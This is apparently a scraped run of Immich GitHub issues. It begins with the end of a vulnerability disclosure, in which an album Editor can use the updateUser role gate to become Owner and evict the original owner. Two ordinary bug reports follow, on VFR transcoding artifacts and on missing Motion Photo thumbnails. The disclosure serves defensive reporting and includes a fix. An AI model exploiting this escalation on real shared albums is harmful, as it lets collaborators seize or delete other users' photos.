A user invited as Editor (a normal collaboration state) takes over the shared album: changes any member's role, becomes Owner, can delete the album and evict the original owner. Integrity-high.

## Net-new

Distinct from GHSA-237r-x578-h5mv (API key privesc) and GHSA-24fq-72x8-v7hm (album open-redirect). No advisory covers the `updateUser` role gate.

## Remediation

Gate `updateUser` on owner-only access (mirror `removeUser`/`addUsers`' `checkOwnerAccess`), and reject `dto.role === Owner` and targeting the current owner.

title: Video transcoding produces visible motion artifacts on VFR source footage due to fps_mode=passthrough
author: Dan-Kev
body:
### I have searched the existing issues, both open and closed, to make sure this is not a duplicate report.

- [x] Yes

### Describe the bug

Videos recorded with variable frame rate (VFR) — common with Android phone cameras — produce visible "ghosting"/motion-blur-like macroblock artifacts in the transcoded (encoded) version at multiple points in the video, even though the original file plays back perfectly and decodes without any errors via ffmpeg.

The artifacts look like overlapping/smeared frames, concentrated on high-motion segments (camera panning), and are 100% deterministic — they appear at the exact same timestamps every time the file is re-transcoded, regardless of CRF, bitrate, resolution, bframes, or GOP size settings.

This may be related to #17674, which reports visually similar corruption in transcoded output (original intact, transcode corrupted) but via VAAPI hardware acceleration rather than software encoding, and without a confirmed root cause. My setup uses software encoding only (hardware acceleration disabled), so this could be a related but distinct manifestation of the same underlying timestamp-handling issue.

### Root cause (confirmed via manual testing)

The source video has mismatched fps/tbr metadata, a hallmark of VFR: 30.03 fps, 29.83 tbr

Immich's transcoding command uses `-fps_mode passthrough`, which preserves the original (uneven) frame timestamps. When combined with the Jellyfin-ffmpeg build shipped in the immich-server image (`ffmpeg version 7.1.4-Jellyfin`), this produces non-monotonic PTS/DTS warnings during encoding: 
[libx264] non-strictly-monotonic PTS0:00.26 ...
[vost#0:0/libx264] Non-monotonic DTS; previous: 22656, current: 22656; changing to 22657. This may result in incorrect timestamps in the output file.

These warnings do NOT appear when `-fps_mode` is changed from `passthrough` to `cfr`, and the resulting output is artifact-free.

Notably, running the exact same command with the standard Ubuntu ffmpeg build (6.1.1-3ubuntu5) on the host, outside the container, does NOT reproduce the artifact — this appears specific to how the Jellyfin-ffmpeg build handles non-monotonic timestamps under `passthrough` mode.

### Expected behavior

Transcoded output should be visually clean and match the source quality, regardless of the source's frame timing regularity.

### Workaround found

Manually running the same ffmpeg command used by Immich (extracted from debug logs) but replacing `-fps_mode passthrough` with `-fps_mode cfr` (without forcing an explicit `-r` value, so the original framerate is preserved) eliminates the artifacts entirely, with no other settings changed.

### Suggested fix

Consider either:
- Making `fps_mode` configurable in Admin Settings (similar to bframes/gopSize in Advanced settings), or
- Changing the default to `cfr` for cases where the source's fps/tbr metadata indicates VFR, while keeping `passthrough` for genuinely CFR sources to avoid unnecessary re-timing

title: Motion Photo companion assets return 404 thumbnails when encoded_video asset_file row is missing
author: a2guy
body:
### I have searched the existing issues, both open and closed, to make sure this is not a duplicate report.

- [x] Yes

### The bug

Some Samsung Motion Photos appear as broken thumbnails in the Immich timeline.

The parent JPEG asset is visible in the timeline and has valid thumbnail and preview files. The linked Motion Photo MP4 companion is correctly marked as hidden, and the MP4 file exists and is readable, but the companion has no `asset_file` row of type `encoded_video`.

The Immich API reports the companion asset as:

- type: `VIDEO`
- visibility: `hidden`
- resized: `true`
- isOffline: `false`
- hasMetadata: `true`

However, requesting the companion thumbnail returns HTTP 404 with `Asset media not found`.

The browser appears to request thumbnails for these hidden Motion Photo companion assets, which results in broken timeline tiles.

In this library:

- 1,401 hidden Motion Photo companion videos exist
- 1,083 have an `asset_file` row of type `encoded_video`
- 318 have no `asset_file` rows
- all 318 parent JPEG assets are visible in the timeline
- all 318 parent JPEG assets have valid thumbnail and preview records

Example affected companion asset:

- Asset ID: `7d6efc94-d677-419c-b519-0720d5b0d59e`
- Original filename: `20211127_153910.mp4`
- Visibility: `hidden`
- Type: `VIDEO`
- Duration: approximately 3 seconds
- Resolution: 1920 × 864
- API reports `resized: true`
- No rows exist in `asset_file` for this asset

Parent asset:

- Asset ID: `78213d44-2fd5-4010-9d34-4be3def1625c`
- Original filename: `20211127_153910.jpg`
- Visibility: `timeline`
- Parent has valid preview and thumbnail files

The companion MP4 exists at the path recorded in `originalPath` and is readable by ffprobe:

- codec: H.264
- audio: AAC
- duration: approximately 3 seconds
- file size: approximately 4.1 MB

Parent thumbnail request:

HTTP 200
Content-Type: image/webp

Hidden companion thumbnail request:

HTTP 404
Content-Type: application/json

Running the supported per-asset job:

{
  "assetIds": ["7d6efc94-d677-419c-b519-0720d5b0d59e"],
  "name": "transcode-video"
}

returns HTTP 204 and the job immediately completes, but it does not create the missing encoded_video row.

Expected behavior:

Hidden Motion Photo companion assets should either have their expected encoded_video record created during processing, or they should not be requested as independent thumbnail assets by the web client.

Actual behavior:

The MP4 exists and is readable, and the asset is marked processed, but the generated-file database record is absent. The thumbnail endpoint returns 404, and the normal transcode job performs no repair.

Additional context:

The Immich server container previously experienced an ffmpeg memory-cgroup OOM event during processing. This may have interrupted processing after the MP4 file was written but before the asset_file row was committed.

I have not manually modified the Immich database.

### Reproduction steps

1.1. Import Samsung Motion Photos into Immich.

2. Allow Immich to process the assets normally.

3. Open the Immich web timeline in Chrome.

4. Navigate to a date containing affected Samsung Motion Photos.

5. Observe that some Motion Photo tiles display **Error loading image**.

6. Click one of the broken tiles.

7. The linked Motion Photo video can still open/play, even though the timeline thumbnail failed.

8. Request the visible parent JPEG thumbnail through the API:

   `GET /api/assets/78213d44-2fd5-4010-9d34-4be3def1625c/thumbnail?size=thumbnail`

   Result:

   `HTTP 200`
   `Content-Type: image/webp`

9. Request the hidden Motion Photo companion thumbnail through the API:

   `GET /api/assets/7d6efc94-d677-419c-b519-0720d5b0d59e/thumbnail?size=thumbnail`

   Result:

   `HTTP 404`
   `Content-Type: application/json`

10. Confirm that the hidden companion asset:

    - is type `VIDEO`
    - has visibility `hidden`
    - has `resized: true`
    - has a valid MP4 file on disk
    - is readable by ffprobe
    - has no `asset_file` row of type `encoded_video`

11. Run the supported per-asset job:

    ```json
    {
      "assetIds": ["7d6efc94-d677-419c-b519-0720d5b0d59e"],
      "name": "transcode-video"
    }
    ```

12. The API returns HTTP 204 and the job completes immediately, but the missing `encoded_video` row is not created and the thumbnail endpoint continues to return 404.
